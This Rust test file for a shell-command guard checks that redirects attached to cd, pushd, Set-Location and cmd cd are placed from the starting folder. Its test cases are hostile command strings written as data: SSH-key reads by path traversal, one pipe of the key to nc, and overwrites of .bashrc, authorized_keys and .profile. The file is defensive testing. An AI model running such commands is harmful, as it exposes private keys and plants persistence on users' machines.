//! A redirect on a `cd`, `chdir`, `pushd`, `Set-Location` or cmd `cd` is
//! opened before the command runs, so its file is placed from the folder the
//! command starts in, not from the folder it goes to. `cd sub <
//! ../../.ssh/id_rsa` opens the same key `cat ../../.ssh/id_rsa` does, and
//! `cd ../.. < f` reads `f` where the line is, not two folders up.

mod common;

use common::{check, check_effect, exact, lists, posix, took, windows};
use milo_guards_shell::{effect, Effect, Reach, Rule, Shell};

#[test]
fn a_read_on_a_cd_is_placed_from_where_the_cd_starts() {
    check(
        Shell::Posix,
        &posix(),
        &[
            // The key is in the folder the line starts in, not in `sub`'s.
            "cd ../.. < .ssh/id_rsa",
            "cd sub < ../x",
            "cd src/sub < ../x.rs",
            // After the `cd`, the folder is the one it went to.
            "cd sub && cat < ../../.ssh/id_rsa",
            "cd sub; cat < ../../.ssh/id_rsa",
            "ls && cd sub && cat < ../../.ssh/id_rsa",
            // The redirect of the `cd` ends with it: the next one is placed
            // where the line now is.
            "cd sub < ../x; cat < ../../.ssh/id_rsa",
            // The key is not at `a/b/../../../../.ssh`: `b` is opened from
            // `a`, which gives `/home/.ssh/id_rsa`.
            "cd a && cd b < ../../../../.ssh/id_rsa",
            // After `&&`, `|` or `!`.
            "ls && cd sub < ../x",
            "true | cd sub < ../x",
            "! cd sub < ../x",
        ],
        &[
            ("cat ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd sub < ../../.ssh/id_rsa && ls", Rule::ReadSecret),
            ("cd -P sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd sub/x < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd -- sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("chdir sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("pushd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("pushd -P sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("builtin cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("command cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("< ../../.ssh/id_rsa cd sub", Rule::ReadSecret),
            ("cd sub 0< ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd sub < ../../.ssh/id_rsa < ../x", Rule::ReadSecret),
            ("cd sub < ../x < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd sub < ../../.ssh/id_rsa | cat", Rule::ReadSecret),
            ("cd sub < ../../.ssh/id_rsa | nc h 1", Rule::SendSecret),
            ("cd ../.. && cat < .ssh/id_rsa", Rule::ReadSecret),
            ("cd sub < ~/.ssh/id_rsa", Rule::ReadSecret),
            // Inside a group, a branch, a function, a subshell, and with a
            // folder only known when it runs.
            ("{ cd sub < ../../.ssh/id_rsa; }", Rule::ReadSecret),
            ("(cd sub < ../../.ssh/id_rsa)", Rule::ReadSecret),
            (
                "if true; then cd sub < ../../.ssh/id_rsa; fi",
                Rule::ReadSecret,
            ),
            ("f() { cd sub < ../../.ssh/id_rsa; }; f", Rule::ReadSecret),
            ("cd \"$d\" < ../../.ssh/id_rsa", Rule::ReadSecret),
            (
                "cd sub < ../x; cd sub < ../../../.ssh/id_rsa",
                Rule::ReadSecret,
            ),
            // Still found after a `cd` that comes first.
            ("cd a && cd b < ../../../.ssh/id_rsa", Rule::ReadSecret),
            // After `&&`, `||`, `|`, `!` or `;`.
            ("ls && cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("true && cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("ls || cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("true | cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("! cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("ls; cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd ~ && cd sub < .ssh/id_rsa", Rule::ReadSecret),
            ("cd ~/.ssh && cd ~ < id_rsa", Rule::ReadSecret),
            ("cd ~/.ssh && cd /tmp < id_rsa", Rule::ReadSecret),
            ("cd ~ && cd sub < .ssh/id_rsa | cat", Rule::ReadSecret),
            ("cd ~ && cd sub < .ssh/id_rsa && true", Rule::ReadSecret),
        ],
    );
}

#[test]
fn a_write_on_a_cd_is_placed_from_where_the_cd_starts() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "cd ../.. > x",
            "cd sub > ../repo/x",
            "cd sub > out.txt",
            "ls && cd sub > out.txt",
            "cd ~ && cd /tmp > work/repo/out.txt",
        ],
        &[
            ("cd sub > ../x", Rule::Overwrite),
            ("cd sub >> ../x", Rule::Overwrite),
            ("cd sub 2> ../x", Rule::Overwrite),
            ("cd sub &> ../x", Rule::Overwrite),
            ("pushd sub > ../x", Rule::Overwrite),
            ("chdir sub > ../x", Rule::Overwrite),
            ("cd sub > ../x && ls", Rule::Overwrite),
            ("cd sub > ~/x", Rule::Overwrite),
            // After the `cd`, the folder is the one it went to.
            ("cd .. && echo hi > x", Rule::Overwrite),
            // After `&&` or `;`.
            ("cd ~ && cd /tmp > .bashrc", Rule::Overwrite),
            ("cd ~/.ssh && cd /tmp > authorized_keys", Rule::Overwrite),
            ("cd ~; cd /tmp > .bashrc", Rule::Overwrite),
        ],
    );
    // A write is a change wherever it is placed.
    assert_eq!(
        effect("cd sub > ../x", Shell::Posix, &posix()),
        Effect::Changes
    );
}

#[test]
fn a_redirect_after_a_here_document_start_on_a_cd_is_placed_from_where_it_starts() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "cd sub <<EOF > out.txt\nx\nEOF",
            "cd sub <<EOF < ../x\nx\nEOF",
        ],
        &[
            ("cd sub <<EOF < ../../.ssh/id_rsa\nx\nEOF", Rule::ReadSecret),
            (
                "cd sub <<-EOF < ../../.ssh/id_rsa\nx\nEOF",
                Rule::ReadSecret,
            ),
            (
                "pushd sub <<EOF < ../../.ssh/id_rsa\nx\nEOF",
                Rule::ReadSecret,
            ),
            ("cd sub <<< x < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("pushd sub <<< x < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd sub <<EOF > ../../.bashrc\nx\nEOF", Rule::Overwrite),
            ("cd sub <<-EOF > ../../.bashrc\nx\nEOF", Rule::Overwrite),
            ("pushd sub <<EOF > ../../.bashrc\nx\nEOF", Rule::Overwrite),
            ("cd sub <<< x > ../../.bashrc", Rule::Overwrite),
            ("pushd sub <<< x > ../../.bashrc", Rule::Overwrite),
        ],
    );
}

#[test]
fn the_paths_of_a_cd_with_a_read_are_placed_from_where_it_starts() {
    let repo = "/home/me/work/repo";
    let key_then_sub = || {
        vec![
            exact(&format!("{repo}/../../.ssh/id_rsa")),
            exact(&format!("{repo}/sub")),
        ]
    };
    lists(
        Shell::Posix,
        &posix(),
        &[
            (
                "cd x < f",
                vec![exact(&format!("{repo}/f")), exact(&format!("{repo}/x"))],
            ),
            ("cd sub < ../../.ssh/id_rsa", key_then_sub()),
            (
                "cd x < link/../etc/hosts",
                vec![
                    exact(&format!("{repo}/link/../etc/hosts")),
                    exact(&format!("{repo}/x")),
                ],
            ),
            (
                "cd src/sub < ../x.rs",
                vec![
                    exact(&format!("{repo}/../x.rs")),
                    exact(&format!("{repo}/src/sub")),
                ],
            ),
            (
                "pushd x < f",
                vec![exact(&format!("{repo}/f")), exact(&format!("{repo}/x"))],
            ),
            (
                "< f cd x",
                vec![exact(&format!("{repo}/f")), exact(&format!("{repo}/x"))],
            ),
            // A read after the `cd` is from where it went.
            (
                "cd x && cat < f",
                vec![exact(&format!("{repo}/x")), exact(&format!("{repo}/x/f"))],
            ),
            // After `&&` or `|`.
            ("true && cd sub < ../../.ssh/id_rsa", key_then_sub()),
            ("true | cd sub < ../../.ssh/id_rsa", key_then_sub()),
            // After a here-document start.
            ("cd sub <<EOF < ../../.ssh/id_rsa\nx\nEOF", key_then_sub()),
            (
                "pushd sub <<EOF < ../../.ssh/id_rsa\nx\nEOF",
                key_then_sub(),
            ),
        ],
    );
    check_effect(
        Shell::Posix,
        &posix(),
        Effect::ReadsOnly(Reach::Workspace),
        &[
            "cd x < f",
            "pushd x < f",
            "cd x && cat < f",
            "cd x < ../repo/f",
        ],
    );
    // `../x.rs` from the line's starting folder is outside it.
    check_effect(
        Shell::Posix,
        &posix(),
        Effect::ReadsOnly(Reach::Beyond),
        &["cd src/sub < ../x.rs", "cd sub < ../x"],
    );
}

#[test]
fn a_write_on_a_set_location_is_placed_from_where_it_starts() {
    check(
        Shell::PowerShell,
        &windows(),
        &[
            "Set-Location ..\\.. > x.txt",
            "cd sub > ..\\repo\\x.txt",
            // An argument that does not move the line changes nothing.
            "Set-Location $(Get-Item sub) > ..\\repo\\x.txt",
        ],
        &[
            ("Set-Location sub > ..\\x.txt", Rule::Overwrite),
            ("cd sub > ..\\x.txt", Rule::Overwrite),
            ("sl sub > ..\\x.txt", Rule::Overwrite),
            ("Set-Location sub 2> ..\\x.txt", Rule::Overwrite),
            ("Push-Location sub > ..\\x.txt", Rule::Overwrite),
            ("Set-Location -Path sub > ..\\x.txt", Rule::Overwrite),
            ("Set-Location sub >> ..\\x.txt", Rule::Overwrite),
            ("Set-Location .. ; 'x' > ..\\x.txt", Rule::Overwrite),
            ("Set-Location $(Get-Item sub) > ..\\x.txt", Rule::Overwrite),
            ("Set-Location $x > ..\\x.txt", Rule::Overwrite),
        ],
    );
}

#[test]
fn a_write_on_a_cmd_cd_is_placed_from_where_it_starts() {
    check(
        Shell::Cmd,
        &windows(),
        &["cd ..\\.. > x.txt", "cd sub > ..\\repo\\x.txt"],
        &[
            ("cd sub > ..\\x.txt", Rule::Overwrite),
            ("chdir sub > ..\\x.txt", Rule::Overwrite),
            ("pushd sub > ..\\x.txt", Rule::Overwrite),
            ("> ..\\x.txt cd sub", Rule::Overwrite),
            ("cd sub 2> ..\\x.txt", Rule::Overwrite),
            ("cd sub >> ..\\x.txt", Rule::Overwrite),
            ("cd sub > ..\\x.txt & dir", Rule::Overwrite),
        ],
    );
}

#[test]
fn a_redirect_on_a_cd_in_a_loop_or_a_function_is_also_placed_from_where_it_goes() {
    // The body runs more than once: the next pass starts where the last
    // one's `cd` went, so the file may be opened from either folder.
    check(
        Shell::Posix,
        &posix(),
        &[
            "for i in 1 2; do cd sub > out.txt; done",
            "f() { cd sub < ../x; }; f; f",
        ],
        &[
            ("for i in 1 2; do cd .. > x; done", Rule::Overwrite),
            ("while true; do cd .. > x; done", Rule::Overwrite),
            ("until false; do cd .. > x; done", Rule::Overwrite),
            (
                "for i in 1 2; do cd .. < ../.ssh/id_rsa; done",
                Rule::ReadSecret,
            ),
            (
                "while true; do cd .. < ../.ssh/id_rsa; done",
                Rule::ReadSecret,
            ),
            ("f() { cd .. > x; }; f; f", Rule::Overwrite),
            ("f() { cd .. < ../.ssh/id_rsa; }; f; f", Rule::ReadSecret),
        ],
    );
    check(
        Shell::PowerShell,
        &windows(),
        &["Set-Location sub > out.txt"],
        &[
            ("foreach ($i in 1..2) { cd .. > x.txt }", Rule::Overwrite),
            ("1..2 | ForEach-Object { cd .. > x.txt }", Rule::Overwrite),
            ("while ($true) { Set-Location .. > x.txt }", Rule::Overwrite),
            (
                "for ($i=0; $i -lt 2; $i++) { Set-Location .. > x.txt }",
                Rule::Overwrite,
            ),
            (
                "function f { Set-Location .. > x.txt }; f; f",
                Rule::Overwrite,
            ),
        ],
    );
}

#[test]
fn a_redirect_on_a_cd_after_a_cd_that_may_not_have_moved_is_also_placed_from_where_it_goes() {
    // The first `cd` may not have moved the line (it failed, ran in a pipeline
    // stage or in the background, or its branch did not run): the second one
    // may start in the folder the line began in.
    check(
        Shell::Posix,
        &posix(),
        &[
            "cd sub && cd .. > x",
            "cd sub; cd .. > ../repo/x",
            "if true; then cd sub > out.txt; fi",
        ],
        &[
            ("cd sub || cd .. > ../x", Rule::Overwrite),
            ("cd sub | cd .. > ../x", Rule::Overwrite),
            ("cd sub & cd .. > ../x", Rule::Overwrite),
            ("if false; then cd sub; fi; cd .. > ../x", Rule::Overwrite),
            ("true || cd sub; cd .. > ../x", Rule::Overwrite),
        ],
    );
    check(
        Shell::PowerShell,
        &windows(),
        &[],
        &[
            ("cd sub || cd .. > ..\\x.txt", Rule::Overwrite),
            ("if ($false) { cd sub }; cd .. > ..\\x.txt", Rule::Overwrite),
            ("cd sub | cd .. > ..\\x.txt", Rule::Overwrite),
        ],
    );
    check(
        Shell::Cmd,
        &windows(),
        &[],
        &[
            ("cd sub | cd .. > ..\\x.txt", Rule::Overwrite),
            ("cd sub || cd .. > ..\\x.txt", Rule::Overwrite),
        ],
    );
}

#[test]
fn a_cd_run_through_a_wrapper_does_not_move_the_line_so_a_later_redirect_is_also_placed_from_where_it_goes(
) {
    // `env cd`, `nohup cd`, `timeout 5 cd` and the like run the `cd` as a
    // program of its own, and `coproc` runs it in a subshell: the line never
    // moves, so the second `cd` starts in the folder the line began in.
    check(
        Shell::Posix,
        &posix(),
        &[],
        &[
            (
                "env cd a/b/c; cd .. > ../../../home/me/.bashrc",
                Rule::Overwrite,
            ),
            (
                "nohup cd a/b/c; cd .. > ../../../home/me/.bashrc",
                Rule::Overwrite,
            ),
            (
                "timeout 5 cd a/b/c; cd .. > ../../../home/me/.bashrc",
                Rule::Overwrite,
            ),
            (
                "xargs cd a/b/c; cd .. > ../../../home/me/.bashrc",
                Rule::Overwrite,
            ),
            (
                "coproc cd a/b/c; cd .. > ../../../home/me/.bashrc",
                Rule::Overwrite,
            ),
            ("env cd sub; cd .. > ../x", Rule::Overwrite),
            ("nohup cd sub; cd .. > ../x", Rule::Overwrite),
            ("timeout 5 cd sub; cd .. > ../x", Rule::Overwrite),
            ("xargs cd sub; cd .. > ../x", Rule::Overwrite),
            ("stdbuf -o0 cd sub; cd .. > ../x", Rule::Overwrite),
            ("nice cd sub; cd .. > ../x", Rule::Overwrite),
            ("setsid cd sub; cd .. > ../x", Rule::Overwrite),
            ("chroot / cd sub; cd .. > ../x", Rule::Overwrite),
            ("coproc cd sub; cd .. > ../x", Rule::Overwrite),
            ("coproc { cd sub; }; cd .. > ../x", Rule::Overwrite),
            ("coproc X { cd sub; }; cd .. > ../x", Rule::Overwrite),
        ],
    );
    // `start` opens a new window: the `cd` there does not move this one.
    check(
        Shell::Cmd,
        &windows(),
        &[],
        &[
            ("start cd sub & cd .. > ..\\x.txt", Rule::Overwrite),
            ("start \"\" cd sub & cd .. > ..\\x.txt", Rule::Overwrite),
            ("start /b cd sub & cd .. > ..\\x.txt", Rule::Overwrite),
            (
                "start cd a\\b\\c & cd .. > ..\\..\\..\\x.txt",
                Rule::Overwrite,
            ),
            (
                "start cd sub & cd .. < ..\\..\\.ssh\\id_rsa",
                Rule::ReadSecret,
            ),
        ],
    );
}

#[test]
fn a_redirect_in_or_after_an_argument_that_moves_the_line_is_opened_where_it_has_moved() {
    // PowerShell runs a `$()` argument in the session first: a redirect
    // inside it is made from the folder that moved the session to, and the
    // command's own redirect file is in the folder the argument moved to,
    // not where the outer command starts.
    check(
        Shell::PowerShell,
        &windows(),
        &[],
        &[
            ("cd $(cd ..\\..; 'x' > y.txt; 'sub')", Rule::Overwrite),
            ("cd $(cd ..\\..; 'x' > y.txt)", Rule::Overwrite),
            ("cd sub $(cd ..\\..; 'x' > y.txt)", Rule::Overwrite),
            ("cd $(cd ..\\..; $v > y.txt; 'sub')", Rule::Overwrite),
            ("cd $(cd ..\\..; \"x\" >> y.txt; 'sub')", Rule::Overwrite),
            ("cd $(cd ~; 'x' > .profile; 'sub')", Rule::Overwrite),
            (
                "Push-Location $(Push-Location ..\\..; 'x' > y.txt; 'sub')",
                Rule::Overwrite,
            ),
            (
                "Set-Location $(Set-Location ..\\..; 'x' > y.txt; 'sub')",
                Rule::Overwrite,
            ),
            ("Set-Location $(cd ..\\..; 'sub') > x.txt", Rule::Overwrite),
            (
                "Set-Location $(cd ..\\..; 'sub') > dev\\repo\\x.txt",
                Rule::Overwrite,
            ),
            ("cd $(cd ..\\..; 'sub') >> x.txt", Rule::Overwrite),
        ],
    );
}

#[test]
#[cfg_attr(
    coverage,
    ignore = "timing: `just timing` runs it in an optimized build"
)]
fn many_redirects_and_substitutions_on_one_command_are_read_in_linear_time() {
    // Where a command starts is read once for the command, not once for each
    // of its redirects: a line of many substitutions and many redirects was
    // read in time that grew with their product (4 s for the first line, 0.1 s
    // linear, in an optimized build). A line of a quarter of the size takes
    // about a quarter of the time, and one read in quadratic time sixteen
    // times as long; the lines are compared with each other, so a busy
    // machine or an unoptimized build, which slow both, does not fail the
    // test.
    type Line = (Shell, fn(usize, usize) -> String, usize, usize);
    let lines: [Line; 6] = [
        // The redirects and the substitutions in turn, each substitution a
        // command with a redirect of its own.
        (
            Shell::Posix,
            |pairs, _| format!("cat{}", " $(a <g) <f".repeat(pairs)),
            5_000,
            0,
        ),
        (
            Shell::Posix,
            |subs, reads| format!("cat{}{}", " $(a)".repeat(subs), " <f".repeat(reads)),
            6_000,
            9_000,
        ),
        (
            Shell::Posix,
            |subs, reads| format!("cat{}{}", " $(a)".repeat(subs), " <f".repeat(reads)),
            10_000,
            4_500,
        ),
        (
            Shell::Posix,
            |subs, writes| format!("cat{}{}", " $(a)".repeat(subs), " >f".repeat(writes)),
            6_000,
            9_000,
        ),
        (
            Shell::PowerShell,
            |subs, writes| format!("cd{}{}", " $(a)".repeat(subs), " > f".repeat(writes)),
            2_000,
            3_000,
        ),
        (
            Shell::PowerShell,
            |subs, writes| {
                format!(
                    "Get-Content{}{}",
                    " $(a)".repeat(subs),
                    " > f".repeat(writes)
                )
            },
            2_000,
            3_000,
        ),
    ];
    let floor = std::time::Duration::from_millis(5);
    for (shell, line, subs, redirects) in lines {
        let paths = if shell == Shell::Posix {
            posix()
        } else {
            windows()
        };
        let big = line(subs, redirects);
        assert!(big.len() <= 64 * 1024, "{}", big.len());
        let small = line(subs / 4, redirects / 4);
        // `effect`, `explain` and `effect_paths` agree with `classify` on
        // both lines.
        let _ = common::classify(&small, shell, &paths);
        let _ = common::classify(&big, shell, &paths);
        let mut last = (std::time::Duration::ZERO, std::time::Duration::ZERO);
        let linear = (0..3).any(|_| {
            last = (took(&small, shell, &paths), took(&big, shell, &paths));
            last.1 <= 10 * last.0.max(floor)
        });
        assert!(
            linear,
            "{shell:?}: {} bytes took {:?}, {} bytes took {:?}",
            small.len(),
            last.0,
            big.len(),
            last.1
        );
    }
}
